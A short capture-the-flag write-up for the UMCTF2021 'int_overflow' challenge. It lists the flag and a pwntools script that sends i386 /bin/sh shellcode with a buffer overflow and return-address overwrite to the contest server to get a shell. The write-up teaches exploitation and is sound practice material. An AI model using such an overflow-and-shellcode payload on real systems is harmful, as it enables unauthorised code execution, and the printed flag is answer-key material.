
# UMCTF2021 - int_overflow

- Write-Up Author: Mark0519 \[[Merak天璇 20级](https://we.buptmerak.cn/)\]

- Flag:MOCSCTF{y35,y0u_c4n_0v3rfl0w_7h1n65_07h3r_7h4n_c0ff33@merak}

## **Question:**
int_overflow
[int_overflow](./bin/int_overflow)
## Write up

---

```python
from pwn import *

#p = process('./bin/int_overflow')
p = remote('52.175.52.175','39005')
context.log_level = 'debug'

elf=ELF('./bin/int_overflow')
passwd_buf_addr = elf.symbols['passwd_buf']
shellcode = shellcraft.i386.sh()
"""
gdb.attach(p,'''
b*check
c
	''')
	"""
p.recvuntil("wd:\n")     
payload = asm(shellcode).ljust(0x3b+4,b'a')+p32(passwd_buf_addr)+b'a'*194  #63+4+194=261
p.sendline(payload)
p.interactive()

```